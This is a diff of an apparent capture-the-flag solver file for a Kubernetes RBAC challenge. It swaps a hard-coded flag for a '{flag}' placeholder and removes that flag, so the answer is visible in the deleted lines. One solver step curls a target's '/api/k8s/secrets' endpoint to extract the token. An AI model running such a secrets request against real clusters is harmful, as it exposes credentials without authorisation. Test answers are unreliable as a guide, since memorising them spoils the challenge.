@@ -17,12 +17,12 @@ solver:
     expect: ''
   - name: Recover the assessment token
     command: curl -s http://{target.webapp}/api/k8s/secrets | grep -o 'OCR{[^}]*}'
-    expect: OCR{k8s_rb4c_3sc}
+    expect: '{flag}'
   - name: Confirm the token
-    command: echo OCR{k8s_rb4c_3sc}
-    expect: OCR{k8s_rb4c_3sc}
+    command: echo {flag}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{k8s_rb4c_3sc}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
